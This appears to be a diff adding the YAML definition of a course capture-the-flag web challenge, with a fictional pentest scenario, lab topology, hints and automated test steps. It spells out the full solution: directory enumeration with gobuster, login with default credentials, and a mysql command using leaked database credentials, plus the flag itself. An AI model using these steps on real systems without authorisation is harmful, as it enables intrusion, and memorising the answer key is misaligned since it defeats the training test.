@@ -1,0 +1,140 @@
+name: "NovaTech Solutions - Hidden Login Discovery"
+description: "NovaTech Solutions appears to run a simple corporate website, but hidden administrative interfaces and an exposed database tell a different story. Enumerate, authenticate, and extract."
+
+difficulty: intermediate
+category: web
+duration_minutes: 60
+randomize_ip_offsets: true
+visibility: course
+week: 10
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/10_Hidden_Login_Discovery/"
+flag: "OCR{h1dd3n_d3f4ult_3xp0s3d}"
+
+objectives:
+  - Perform directory enumeration against the web application to discover hidden endpoints
+  - Analyze discovered pages for sensitive information and credentials
+  - Authenticate to a hidden staff portal using discovered default credentials
+  - Identify and connect to a backend database using leaked connection details
+  - Capture the flag
+
+scenario: |
+  NovaTech Solutions is a mid-size software development consultancy based in Austin,
+  Texas. They've recently launched a redesigned corporate website and hired your firm,
+  Blackridge Security, to perform a web application assessment before their SOC 2
+  compliance audit next quarter.
+
+  Your point of contact, Devon Harris (VP of Engineering), provided the following
+  brief: "We just pushed the new site to production last week. The dev team assures
+  me everything is locked down, but I want a second opinion. We're particularly
+  concerned about any leftover development or staging interfaces that might have
+  been accidentally deployed. The site should just be a marketing page - nothing
+  interactive."
+
+  The engagement scope covers the web application on the target host and any backend
+  services you discover on the subnet. Devon mentioned they run a MySQL database
+  somewhere on the network but insisted it's "not internet-facing."
+
+  A security token has been placed on each system as part of the assessment scope.
+  Collect all three tokens and combine them as OCR{token1_token2_token3} to complete
+  the engagement.
+
+credentials:
+  - username: "admin"
+    password: "NovaTech2024#"
+    role: "staff"
+    description: "Default staff portal credentials (discovered during assessment)"
+  - username: "novatech_app"
+    password: "Pr0d_DB_2024#"
+    role: "db"
+    description: "MySQL application credentials (leaked from staff portal config)"
+
+hints:
+  - text: |
+      The website looks like a simple marketing page, but developers often leave
+      internal tools and portals accessible. Use a directory enumeration tool like
+      gobuster or dirb with a common wordlist to discover hidden paths. Pay attention
+      to the robots.txt file - it sometimes reveals directories the developers
+      wanted to hide from search engines.
+    unlock_after_minutes: 10
+  - text: |
+      Run: gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
+      You should find several paths including a staff portal. Check the HTML source
+      of the login page carefully - developers sometimes leave comments in the code.
+      The default credentials for the portal follow a common pattern: admin with a
+      company-themed password.
+    unlock_after_minutes: 20
+  - text: |
+      The staff portal is at /staff-portal/. View the page source to find a build
+      tag comment (that's token 1). Login with admin / NovaTech2024# to access the
+      dashboard. The dashboard shows token 2 and leaks MySQL connection details.
+      Use those credentials to connect to the database server:
+      mysql -h <db_ip> -u novatech_app -p'Pr0d_DB_2024#' novatech -e "SELECT * FROM audit_tokens"
+    unlock_after_minutes: 30
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Web Application"
+      type: "server"
+      ip_offset: "23"
+      ports: [80]
+      services: ["nginx", "Flask"]
+      x: 2
+      y: 1
+    - id: "dbserver"
+      label: "Database Server"
+      type: "database"
+      ip_offset: "41"
+      ports: [3306]
+      services: ["MySQL 8.0"]
+      x: 4
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "direct"
+    - from: "webapp"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Web application responds on port 80"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/"
+      expect: "200"
+
+    - name: "Discover robots.txt with hidden paths"
+      command: "curl -s http://{target.webapp}/robots.txt"
+      expect: "staff-portal"
+
+    - name: "Access hidden staff portal login page"
+      command: "curl -s http://{target.webapp}/staff-portal/"
+      expect: "NovaTech Staff Portal"
+
+    - name: "Extract token 1 from login page source comment"
+      command: "curl -s http://{target.webapp}/staff-portal/ | grep -o 'Build: [a-z0-9]*' | awk '{print $2}'"
+      expect: "h1dd3n"
+
+    - name: "Login with default credentials and access dashboard"
+      command: "curl -s -c /tmp/nova-jar http://{target.webapp}/staff-portal/login -d 'username={cred.staff.user}&password={cred.staff.pass}' -L 2>&1"
+      expect: "d3f4ult"
+      timeout: 15
+
+    - name: "Extract database credentials from dashboard"
+      command: "curl -s -b /tmp/nova-jar http://{target.webapp}/staff-portal/dashboard 2>&1 | grep -o 'Pr0d_DB_2024#'"
+      expect: "Pr0d_DB_2024#"
+
+    - name: "Connect to MySQL and extract token 3"
+      command: "mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' novatech -N -e 'SELECT token_value FROM audit_tokens WHERE token_name=\"assessment_marker\"' 2>/dev/null"
+      expect: "3xp0s3d"
+      timeout: 20
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{h1dd3n_d3f4ult_3xp0s3d}'"
+      expect: "OCR{h1dd3n_d3f4ult_3xp0s3d}"
